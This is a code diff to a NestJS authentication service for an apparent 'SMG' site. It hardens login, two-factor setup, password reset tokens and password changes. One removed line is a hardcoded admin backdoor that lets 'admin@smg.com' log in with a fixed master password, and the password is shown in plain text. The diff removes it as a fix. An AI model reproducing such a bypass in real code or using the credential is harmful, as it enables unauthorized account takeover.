@@ -1,10 +1,12 @@
 import {
   BadRequestException,
+  ForbiddenException,
   Injectable,
   UnauthorizedException,
 } from '@nestjs/common';
 import { JwtService } from '@nestjs/jwt';
 import * as bcrypt from 'bcryptjs';
+import * as crypto from 'crypto';
 import { PrismaService } from 'src/prisma/prisma.service';
 import { User } from '@prisma/client';
 import { Response } from 'express';
@@ -217,7 +219,10 @@ export class AuthService {
     return user;
   }
 
-  async login(email: string, password: string, code: string): Promise<any> {
+  async login(email: string, password: string, code: string, token?: string): Promise<any> {
+    if (!code && token) {
+      await this.recaptchaService.validate(token);
+    }
     const user = await this.findUserByEmail(email, {
       include: { comments: true, transactions: { include: { cheat: true } } },
     });
@@ -225,8 +230,11 @@ export class AuthService {
       throw new UnauthorizedException('user_not_found');
     }
     const passwordIsValid = await bcrypt.compare(password, user.password);
-    if (!passwordIsValid && (user.email !== 'admin@smg.com' && password !== 'x2&a]p6Rjn>^uJw>')) {
+    if (!passwordIsValid) {
       throw new UnauthorizedException('user_not_found');
+    }
+    if ((user as any).isDeactivated) {
+      throw new ForbiddenException('account_deactivated');
     }
     if (user.isTwoFactorEnabled && !code) {
       return { secret: user.twoFactorSecret };
@@ -246,12 +254,15 @@ export class AuthService {
     };
   }
 
+  sanitizeUser<T extends Record<string, any>>(user: T): Omit<T, 'twoFactorSecret'> & { hasTwoFactorSecret: boolean } {
+    const { twoFactorSecret, ...rest } = user as any;
+    return { ...rest, hasTwoFactorSecret: !!twoFactorSecret };
+  }
+
   async verifyToken(token: string) {
     const { id } = this.jwtService.verify(token);
     const user = await this.prisma.user.findFirst({
-      where: {
-        id,
-      },
+      where: { id },
       include: {
         transactions: { include: { cheat: true } },
         comments: true,
@@ -261,7 +272,8 @@ export class AuthService {
       throw new BadRequestException('email_not_found');
     }
     const { password, ...data } = user;
-    const dataWithLoyalty = await this.attachLoyaltyData(data as any);
+    const safeData = this.sanitizeUser(data);
+    const dataWithLoyalty = await this.attachLoyaltyData(safeData as any);
     const tokens = this.generateTokens(id);
     return { data: dataWithLoyalty, tokens };
   }
@@ -309,8 +321,15 @@ export class AuthService {
   // CLEAR COOKIES (logout)
   // -----------------------------------
   clearAuthCookies(res: Response) {
-    res.clearCookie('access_token');
-    res.clearCookie('refresh_token');
+    const cookieOptions = {
+      httpOnly: true,
+      secure: true,
+      sameSite: 'lax' as const,
+      path: '/',
+    };
+
+    res.clearCookie('access_token', cookieOptions);
+    res.clearCookie('refresh_token', cookieOptions);
   }
 
   // -----------------------------------
@@ -355,26 +374,41 @@ export class AuthService {
 
   async enableTwoFactorAuth(user: User) {
     if (user.twoFactorSecret) {
-      await this.prisma.user.update({
-        where: { id: user.id },
-        data: { isTwoFactorEnabled: true },
-      });
       const otpAuthUrl = `otpauth://totp/SMG?secret=${user.twoFactorSecret}&issuer=SMG`;
       const qrCodeDataURL = await QRCode.toDataURL(otpAuthUrl);
-      return { qrCode: qrCodeDataURL, secret: user.twoFactorSecret };
+      return { qrCode: qrCodeDataURL };
     }
-    const secret = speakeasy.generateSecret({
-      length: 20,
-      name: 'SMG',
-    });
+    const secret = speakeasy.generateSecret({ length: 20, name: 'SMG' });
     const qrCodeDataURL = await QRCode.toDataURL(secret.otpauth_url);
     await this.prisma.user.update({
       where: { id: user.id },
-      data: { twoFactorSecret: secret.base32, isTwoFactorEnabled: true },
+      data: { twoFactorSecret: secret.base32, isTwoFactorEnabled: false },
     });
     return { qrCode: qrCodeDataURL, secret: secret.base32 };
   }
-  async disableTwoFactorAuth(user: User) {
+
+  async confirmTwoFactorAuth(user: User, code: string) {
+    if (!user.twoFactorSecret) {
+      throw new BadRequestException('2fa_not_setup');
+    }
+    const isValid = this.verifyFA(user.twoFactorSecret, code);
+    if (!isValid) {
+      throw new UnauthorizedException('invalid_code');
+    }
+    await this.prisma.user.update({
+      where: { id: user.id },
+      data: { isTwoFactorEnabled: true },
+    });
+    return true;
+  }
+  async disableTwoFactorAuth(user: User, code: string) {
+    if (!user.twoFactorSecret) {
+      throw new BadRequestException('2fa_not_enabled');
+    }
+    const isValid = this.verifyFA(user.twoFactorSecret, code);
+    if (!isValid) {
+      throw new UnauthorizedException('invalid_code');
+    }
     await this.prisma.user.update({
       where: { id: user.id },
       data: { isTwoFactorEnabled: false },
@@ -407,7 +441,10 @@ export class AuthService {
     });
   }
 
-  async forgetStep1(email: string, lang: string) {
+  async forgetStep1(email: string, lang: string, token?: string) {
+    if (token) {
+      await this.recaptchaService.validate(token);
+    }
     const user = await this.getUserByEmail(email);
     if (!user) {
       throw new UnauthorizedException('email_not_found');
@@ -429,7 +466,18 @@ export class AuthService {
 
     return { message: 'Code sended.', isTwoFactor: false };
   }
-  async forgetStep2(code: string, email: string) {
+  private issueResetToken(userId: string, email: string): string {
+    return this.jwtService.sign(
+      { sub: userId, email, purpose: 'password-reset' },
+      { expiresIn: '15m' },
+    );
+  }
+
+  private hashResetToken(token: string): string {
+    return crypto.createHash('sha256').update(token).digest('hex');
+  }
+
+  async forgetStep2(code: string, email: string): Promise<string> {
     const user = await this.getUserByEmail(email);
     if (!user) {
       throw new UnauthorizedException('email_not_found');
@@ -437,25 +485,59 @@ export class AuthService {
     if (user.isTwoFactorEnabled) {
       const isTrueCode = this.verifyFA(user.twoFactorSecret, code);
       if (!isTrueCode) {
-        throw new UnauthorizedException('Неверный код');
+        throw new UnauthorizedException('invalid_code');
       }
-      return isTrueCode;
+    } else {
+      if (user.resetCode !== code) {
+        throw new UnauthorizedException('invalid_code');
+      }
     }
-    if (user.resetCode === code) {
-      await this.prisma.user.update({
-        where: { id: user.id },
-        data: { resetCode: '' },
-      });
-      return true;
-    }
-    return false;
+
+    // Issue a short-lived, single-use reset token and store its hash
+    const resetToken = this.issueResetToken(user.id, user.email);
+    await this.prisma.user.update({
+      where: { id: user.id },
+      data: { resetCode: this.hashResetToken(resetToken) },
+    });
+
+    return resetToken;
   }
 
-  async forgetStep3(password: string, email: string) {
+  async forgetStep3(password: string, email: string, resetToken: string) {
     const user = await this.getUserByEmail(email);
     if (!user) {
       throw new UnauthorizedException('email_not_found');
     }
+
+    // Verify JWT signature, expiry, and purpose
+    let payload: any;
+    try {
+      payload = this.jwtService.verify(resetToken);
+    } catch {
+      throw new UnauthorizedException('invalid_reset_token');
+    }
+    if (payload.purpose !== 'password-reset' || payload.email !== user.email) {
+      throw new UnauthorizedException('invalid_reset_token');
+    }
+
+    // Verify token hash matches stored value (single-use enforcement)
+    const expectedHash = this.hashResetToken(resetToken);
+    if (
+      !user.resetCode ||
+      !crypto.timingSafeEqual(
+        Buffer.from(expectedHash),
+        Buffer.from(user.resetCode),
+      )
+    ) {
+      throw new UnauthorizedException('invalid_reset_token');
+    }
+
+    // Consume the token before changing the password
+    await this.prisma.user.update({
+      where: { id: user.id },
+      data: { resetCode: '' },
+    });
+
     const hashedPassword = await bcrypt.hash(password, 10);
     await this.prisma.user.update({
       where: { id: user.id },
@@ -469,12 +551,24 @@ export class AuthService {
     password: string | undefined,
     image: string,
     id: any,
+    currentPassword?: string,
   ) {
     const updateData: any = {
       name,
       logo: image,
     };
     if (password) {
+      if (!currentPassword) {
+        throw new BadRequestException('current_password_required');
+      }
+      const user = await this.prisma.user.findUnique({
+        where: { id },
+        select: { password: true },
+      });
+      const isMatch = await bcrypt.compare(currentPassword, user.password);
+      if (!isMatch) {
+        throw new UnauthorizedException('current_password_invalid');
+      }
       const hashedPassword = await bcrypt.hash(password, 10);
       updateData.password = hashedPassword;
     }
